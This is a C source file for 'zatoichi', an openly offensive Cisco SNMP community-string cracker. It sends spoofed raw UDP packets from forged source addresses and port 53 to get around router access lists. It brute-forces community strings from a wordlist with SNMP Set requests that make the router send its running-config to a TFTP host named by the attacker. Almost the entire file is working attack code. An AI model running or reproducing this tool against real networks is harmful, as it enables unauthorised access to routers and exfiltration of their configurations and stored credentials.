/*
 *
 *       --[     zatoichi - the blind swordsman     ]--
 *       --[ A Cisco snmpd community string cracker ]--
 *
 *   This is mostly a reworking of snmpbrute by Aidan O'Kelly.
 *   The main thing I've done is reassembled the code, or more
 *   accurately, hacked it together while adding the ability
 *   to bypass ACLs in two ways: source port and source address.
 *
 *   You can spoof any source port, nameserver (53) by default;
 *   and you can specify a class B net. or let it use it's default
 *   192.168.0.0/16 net.  This may get around routers configured
 *   let people from the internal network access it.
 *
 *   enjoy,
 *     Red Skäl
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>

char *makesetreq(char *community, char *value, char *mib, int mibsize,
		 unsigned long id, int *size)
{
	char *buf;
	char *ptr;
	int len;
	len = 27 + strlen(community) + strlen(value) + mibsize;
	buf = (char *) malloc(len + 2);
	ptr = buf;

	*ptr++ = 0x30;
	*ptr++ = len;

	/* SNMP version */
	*ptr++ = 0x02;
	*ptr++ = 0x01;
	*ptr++ = 0x00;

	/* Community */
	*ptr++ = 0x04;
	*ptr++ = strlen(community);
	strcpy(ptr, community);
	ptr = ptr + strlen(community);

	*ptr++ = 0xa3;			/* Set Request */

	*ptr++ = 20 + mibsize + strlen(value);

	/* ID */
	*ptr++ = 0x02;
	*ptr++ = 0x04;
	memcpy(ptr, &id, 4);
	ptr = ptr + 4;

	/* Error Status */
	*ptr++ = 0x02;
	*ptr++ = 0x01;
	*ptr++ = 0x00;

	/* Error Index */
	*ptr++ = 0x02;
	*ptr++ = 0x01;
	*ptr++ = 0x00;

	*ptr++ = 0x030;
	*ptr++ = mibsize + strlen(value) + 6;

	*ptr++ = 0x30;
	*ptr++ = mibsize + strlen(value) + 4;

	*ptr++ = 0x06;			/* Object */
	*ptr++ = mibsize;
	memcpy(ptr, mib, mibsize);
	ptr = ptr + mibsize;

	*ptr++ = 0x04;			/* String */
	*ptr++ = strlen(value);
	memcpy(ptr, value, strlen(value));

	*size = len + 2;
	return buf;
}

int makemibaddr(char *addr, char *buf)
{
	int a, b, c, d, x, y, size;
	char *ptr;
	char *ptr2;

	ptr = strdup(addr);
	size = 4;
	ptr2 = (char *) strchr(ptr, '.');
	*ptr2++ = 0x00;
	a = atoi(ptr);
	ptr = ptr2;
	ptr2 = strchr(ptr, '.');
	*ptr2++ = 0x00;
	b = atoi(ptr);
	ptr = ptr2;
	ptr2 = strchr(ptr, '.');
	*ptr2++ = 0x00;
	c = atoi(ptr);
	ptr = ptr2;
	d = atoi(ptr);
	memset(buf, 0, 8);
	ptr = buf;
	if (a >= 128) {
		x = 129;
		y = a - 128;
		*ptr++ = x;
		*ptr++ = y;
		size++;
	} else {
		*ptr++ = a;
	}
	if (b >= 128) {
		x = 129;
		y = b - 128;
		*ptr++ = x;
		*ptr++ = y;
		size++;
	} else {
		*ptr++ = b;
	}
	if (c >= 128) {
		x = 129;
		y = c - 128;
		*ptr++ = x;
		*ptr++ = y;
		size++;
	} else {
		*ptr++ = c;
	}
	if (d >= 128) {
		x = 129;
		y = d - 128;
		*ptr++ = x;
		*ptr++ = y;
		size++;
	} else {
		*ptr++ = d;
	}
	return size;
}

/* from mixter's socket tutorial */
unsigned short csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

/* construct and send datagram */
void udp_shite(int sock, unsigned long *saddr, unsigned long *daddr,
		unsigned int sport, unsigned int dport, char *data,
		int len)
{
	char *packet;
	int ret;
	struct sockaddr_in dstaddr;
	struct iphdr *ip;
	struct udphdr *udp;
	packet = (char *) malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + len);
	memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr) + len);
	if (packet == NULL) {
		fprintf(stderr, "malloc failed\n");
		exit(EXIT_FAILURE);
	}
	ip = (struct iphdr *) packet;
	udp = (struct udphdr *) (packet + sizeof(struct iphdr));
	ip->saddr = *saddr;
	ip->daddr = *daddr;
	ip->version = 4;
	ip->ihl = 5;
	ip->ttl = 255;
	ip->id = htons((unsigned short) rand());
	ip->protocol = IPPROTO_UDP;
	ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + len);
	ip->check = csum((unsigned short *) ip, sizeof(struct iphdr));
	udp->source = htons(sport);
	udp->dest = htons(dport);
	udp->len = htons(sizeof(struct udphdr) + len);
	memcpy(packet + (sizeof(struct iphdr) + sizeof(struct udphdr)), data,
		len);
	dstaddr.sin_family = AF_INET;
	dstaddr.sin_addr.s_addr = *daddr;
	ret = sendto(sock, packet,
		     sizeof(struct iphdr) + sizeof(struct udphdr) + len, 0,
		     (struct sockaddr *) &dstaddr, sizeof(struct sockaddr_in));
	free(packet);
}

char *itoa(char *str, int num)
{
	int k;
	char c, flag, *ostr;
	if (num < 0) {
		num = -num;
		*str++ = '-';
	}
	k = 10000;
	ostr = str;
	flag = 0;
	while (k) {
		c = num / k;
		if (c || k == 1 || flag) {
			num %= k;
			c += '0';
			*str++ = c;
			flag = 1;
		}
		k /= 10;
	}
	*str = '\0';
	return ostr;
}

char *nextword(char *buf)
{
	char *tmp;
	tmp = buf + strlen(buf);
	tmp++;
	return tmp;
}

void usage(char *prog)
{
	printf(" %s <-t target> <-T tftpd> <-w wordlist> [-s source_net]\n\n", prog);
	printf("\t-t target:\t\tThe IP address of the Cisco you are testing.\n");
	printf("\t-T tftpd:\t\tThe IP address which hosts the TFTP daemon.\n");
	printf("\t-w wordlist:\tLoad the contents for dictionary attack.\n");
	printf("\t-s source_net:\tA class B (0.0.255.255) net to spoof as.\n\n");
	printf(" ex:\n   %s -t 192.168.10.1 -T 192.168.0.10 -w ~/words\n", prog);
	printf(" The above example would scan spoof as 192.168.x.x to 192.168.10.1\n");
	printf(" trying the contents of ~/words to send 'running-config' to\n");
	printf(" 192.168.0.10.\n Add -s 10.0 to spoof as 10.0.x.x\n\n");
}

void banner()
{
	printf("\n zatoichi -- blind swordsman\n");
	printf(" Cisco SNMP community string cracker\n");
	printf(" Plagiarised by Red Skäl\n\n");
	printf(" Original code by Aidan O'Kelly\n\n");
}

int main(int argc, char **argv)
{
	struct stat finfo;
	char *words, *ptr, *saddr, *srcb, *daddr, *wordfile, *tftpd=NULL;
	unsigned int dprt, sprt;
	int i, j, k, p, ret, wordcount, wordfilesize, fd, mibsize, t, pkts;
	char a[1];
	unsigned char mib[60];
	unsigned char tmpmib[9];
	unsigned char *buf;
	char value[60];
	int size, on = 1;
	unsigned long id;
	int sock;
	unsigned long lsaddr, ldaddr;

	saddr = daddr = wordfile = NULL;
	srcb = "192.168";
	sprt = 53;
	dprt = 161;

	banner();

	while ((i = (int) getopt(argc, argv, "t:T:w:s:p:S:hv")) != EOF) {
		switch (i) {
			case 'h':
				usage(argv[0]);
				exit(EXIT_SUCCESS);
			case 'v':
				printf(" %s v0.1.3a\n\n file:\t\t%s\n compiled:\t%s\n\n", argv[0], __FILE__, __DATE__);
				exit(EXIT_SUCCESS);
			case 't':
				daddr = strdup(optarg);
				break;
			case 'T':
				tftpd = strdup(optarg);
				break;
			case 'w':
				wordfile = strdup(optarg);
				break;
			case 's':
				srcb = strdup(optarg);
				break;
			case 'p':
				dprt = atoi(optarg);
				break;
			case 'S':
				sprt = atoi(optarg);
				break;
			case '?':
			default:
				break;
		}
	}
	
	if (argc < 4) {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	if (inet_addr(tftpd) < 0) {
		fprintf(stderr, " tftpd: Invalid address\n\n");
		exit(EXIT_FAILURE);
	}

	if (inet_addr(daddr) < 0) {
		fprintf(stderr, " target: Invalid address\n\n");
		exit(EXIT_FAILURE);
	}

	if (strchr(srcb, '.') == NULL || strlen(srcb) < 3 || strlen(srcb) > 7) {
		fprintf(stderr, " Class-B: Invalid address\n\n"); /* blah! */
		exit(EXIT_FAILURE);
	}

	wordcount = 0;
	if ((fd = open(wordfile, O_RDONLY)) < 0) {
		fprintf(stderr, " open: couldn't open %s\n\n", wordfile);
		exit(EXIT_FAILURE);
	}

	if (stat(wordfile, &finfo) < 0) {
		fprintf(stderr, " stat: problem with %s\n\n", wordfile);
		exit(EXIT_FAILURE);
	}

        /* Sorry for the messy coding from here on out */

	printf(" Router: %s\n tftpd: %s\n Wordlist: %s\n Class-B: %s.x.x\n snmpd port: %d\n spoofed port: %d\n", daddr, tftpd, wordfile, srcb, dprt, sprt);

	wordfilesize = (int) finfo.st_size;
	printf(" %s: size is %d\n", wordfile, wordfilesize);
	words = (char *) malloc(wordfilesize);

	for (i = 0; i < wordfilesize; i++) {
		ret = read(fd, &a, 1);
		if (ret == 1) {
			if (a[0] == '\n') {
				a[0] = 0x00;
				wordcount++;
			}
			memcpy(words + i, a, 1);
		} else {
			printf(" read() returned %d\n", ret);
			break;
		}
	}

	close(fd);
	printf(" word-/line-count: %d\n\n Commencing attack...\n", wordcount);
	ptr = words;

	memset(tmpmib, 0x00, 9);
	mibsize = 9;
	memcpy(mib, "\x2b\x06\x01\x04\x01\x09\x02\x01\x37", mibsize);
	t = makemibaddr(tftpd, tmpmib);
	memcpy(mib + mibsize, tmpmib, t);
	mibsize = mibsize + t;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		fprintf(stderr, " socket: unable to open raw socket\n");
		exit(EXIT_FAILURE);
	}
	
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		fprintf(stderr, " setsockopt: bugged out, phuxx0r\n");
		exit(EXIT_FAILURE);
	}
	
	strcpy(value, "running-config");
	ldaddr = inet_addr(daddr);

	pkts = p = 0;
	
	if ((saddr = malloc(32)) <= 0) {
			fprintf(stderr, "malloc failed: %d", *saddr);
			exit(EXIT_FAILURE);
	}
	
	for (j = 1; j < 255; j++) {
		for (k = 1; k < 255; k++) {
			for (i = 0; i < wordcount; i++) {
				id = rand();
				buf = makesetreq(ptr, value, mib, mibsize, id, &size);
				
				memset(saddr, 0x00, 32);
				
				memcpy(saddr, srcb, strlen(srcb));
				memcpy(saddr + strlen(srcb), ".", 1);
				/* o3 = itoa(o3, j); */
				snprintf(saddr + strlen(srcb) + 1, 4, "%03d", j);
				memcpy(saddr + strlen(srcb) + 4, ".", 1);
				/* o4 = itoa(o4, k); */
				snprintf(saddr + strlen(srcb) + 5, 4, "%03d", k);
				/* memcpy(saddr + strlen(srcb) + 9, 0x00, 1); */
				lsaddr = inet_addr(saddr);
				udp_shite(sock, &lsaddr, &ldaddr, sprt, dprt, buf, size);
				ptr = nextword(ptr);
				
				if ((++pkts % 0x4e20) == 0)
					fprintf(stderr, " Sent %d packets\n Current spoof: %s\n", pkts, saddr);
			}
		}
	}
	
	fflush(stderr);
	printf("\n Attack complete!\n Check tftp (%s) for 'running-config'\n\n", tftpd);
	
	free(saddr);
	free(words);
	return 0;
}
